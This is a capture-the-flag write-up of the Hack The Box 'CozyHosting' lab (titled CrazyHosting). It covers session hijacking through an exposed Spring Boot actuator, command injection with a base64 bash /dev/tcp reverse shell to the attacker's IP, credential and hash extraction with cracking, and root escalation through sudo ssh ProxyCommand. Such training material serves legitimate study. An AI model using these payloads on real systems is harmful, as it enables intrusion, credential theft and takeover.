---
title: Hack The Box | CrazyHosting Writeup  
date: 2024-03-02 23:00:00 +0530
categories: [Blogging, Writeup, Hack The Box]
tags: [CrazyHosting, HTB, Writeup] 
pin: false
math: true
mermaid: true
author: 7h3h0und
image:
  path: /assets/img/headers/crazyhosting.png
  lqip: data:image/png;base64,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
---

The Machine IP address (victim): 10.129.229.88

## Enumeration:

### Port Scan

Lets take the first step with nmap scan `nmap -sV -A -T5 -oA 10.129.229.88 10.129.229.88`

``` bash
# Nmap 7.80 scan initiated Mon Jan 29 17:37:54 2024 as: nmap -sV -A -T5 -oA 10.129.229.88 10.129.229.88
Nmap scan report for 10.129.229.88
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Aggressive OS guesses: HP P2000 G3 NAS device (93%), Linux 2.6.32 (92%), Infomir MAG-250 set-top box (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%), Ubiquiti AirOS 5.5.9 (92%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (92%), Linux 2.6.32 - 3.13 (92%), Linux 3.3 (92%), Linux 2.6.32 - 3.1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   163.73 ms 10.10.14.1
2   163.94 ms 10.129.229.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 29 17:38:14 2024 -- 1 IP address (1 host up) scanned in 19.38 seconds
```

Nmap scan gave out SSH running on port 22, Nginx HTTP web server running on port 80. 

Let's add cozyhosting.htb to our /etc/hosts file with the corresponding IP address in order for
us to be able to access the domain in our browser.

```bash
echo "10.129.229.88 cozyhosting.htb" >> /etc/hosts
```

![img-description](/assets/img/htb/crazyhosting/1.png) _landing page_

As we have the web page access lets go ahead and s fuzz the server for files and directories. We will be using `dirsearch`

```bash
dirsearch -u http://cozyhosting.htb/
```
![img-description](/assets/img/htb/crazyhosting/2.png) _Dirsearch output_
We do observe the login and admin pages, and additionally, we notice that the actuator endpoint is exposed. 

>`Actuator endpoint:`primarily utilized for debugging purposes in Spring Boot applications. The Spring Boot actuator module offers a range of built-in endpoints that expose various types of information and operations within an application.
{: .prompt-info }

While accessing the `/login` page and attempting to authenticate with common credentials (password guessing), we are unable to gain access to the application.

![img-description](/assets/img/htb/crazyhosting/3.png) _Login Page_

### Initial Steps:

I went ahead and started Burp and intercepted, looking at the `actuator/sessions` endpoint, we are able to list all the active sessions and their session IDs. 

![img-description](/assets/img/htb/crazyhosting/4.png) _Actuator Sessions_

Now, we have session identifier token for kanderson, which we can grab and  modify the headers and replace the cookie vaule using burp or browser by using the developer console's Storage tab.

![img-description](/assets/img/htb/crazyhosting/5.png) _Modfied Cookie_

We are now presented with a dashboard and notice that we are logged in as the user K. Anderson.

![img-description](/assets/img/htb/crazyhosting/6.png) _Post Login_

Looking at the bottom of the page, we see a form that require's a hostname and username for automatic patching. If we try submitting the form with the username `test` and the hostname `127.0.0.1`, we get an error back stating that the host was not added.

![img-description](/assets/img/htb/crazyhosting/7.png) _testing form fields_

We know that the username field does not accept white spaces, so to bypass this we can use `${IFS}` as a delimiter, which is a special shell variable that stands for Internal Field Separator and defaults to a space (followed by a tab and a newline) in shells like `Bash` and `sh` 

To test for injection vulnerabilities we need to use Burp again. I put up a python local server on my machine and tried to curl it from the target server.
Using the following payload in the username field, to see if we get a callback. 

```bash
test;curl${IFS}http:/10.10.14.68:8000;
```
which worked! as we see a request to our local server, confirming the command injection.

```python
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
10.129.229.88 - - [29/Jan/2024 18:15:51] "GET / HTTP/1.1" 200 -
```

Now we know that command injection works, I went ahead and tried a oneliner payload which didn't worked. 
However with some research I leanered that we can encode the payload to base64 and then URL encode will work.

Converting payload to base64:
```bash
echo "bash -i >& /dev/tcp/<IP>/<port> 0>&1" | base64 -w 0

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC80NDQ0IDA+JjEK
```

Final Payload:
```bash
;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC80NDQ0IDA+JjEK"|base64${IFS}-d|bash;
```

As we know this playload will not work as we need to remove the spaces, like we did earlier by adding `${IFS}` as a delimiter.

```bash
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44Ny80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

I went ahead and pasted the payload in to burp repeater and URL encoded the payload. I started a netcat listener and send the payload to the target. 
It should hang and the RCE attempt is successful. Now we have access as app user to the machine.

![img-description](/assets/img/htb/crazyhosting/8.png) _gaining reverse shell_

Next step stabilizing the shell!
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

stty raw -echo; fg

#Press Enter twice, and type the command 
export TERM=xterm 
```
### Privilege Escalation:

#### To User Access:
Now that we have our shell setup, let’s look around for user flag.
It seems the user flag is in the user josh’s home directory. There is a jar file placed under the app directory.  

To carry out the analysis, I transfer the file from target machine to my pc using netcat.

```bash
# On Target machine.
nc -l -p pick_a_port < cloudhosting-0.0.1.jar
```
```bash
# On the attacking machine
nc ip_of_target port_of_target > ch.jar
```
I opened the jar file using JD_GUI and looking around I was able to retrive postgress credentials.

![img-description](/assets/img/htb/crazyhosting/9.png) _JD-GUI:cloudhosting-0.0.1.jar_

I went ahead and logged to Postgres with the credentials and we are in.

```bash
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres -W 
Password: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

Once I logged in to the database, I went ahead and pivoted through the tables and
proceed with utilizing the SELECT statement to view all the data present in the users table.

```bash
select * users; 


   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)

(END)
```

With the user hash in hand, I tried cracking it with hashcat.

```bash
sudo hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
![img-description](/assets/img/htb/crazyhosting/10.png) _hashcat_

I was able to successfully crack the password, obtaining the password `manchesterunited`

We can either switch user to josh or connect through a ssh session using the passwords.

```bash
ssh josh@crazyhosting.htb
```

![img-description](/assets/img/htb/crazyhosting/11.png) _SSH Login_


#### From User to Root:

Once logged in, Upon checking the sudo permissions for the user josh, I discover that they can run `/usr/bin/ssh` as root.

![img-description](/assets/img/htb/crazyhosting/12.png) _sudo -l_

As we see Josh user has unrestricted privileges to run ssh as root and can specify any argument.  

There is a payload at GTFOBINS which allows us to get the shell as root.

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![img-description](/assets/img/htb/crazyhosting/13.png) _rooted_

>When the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
{: .prompt-info }


We have the machine `ROOTED!`  
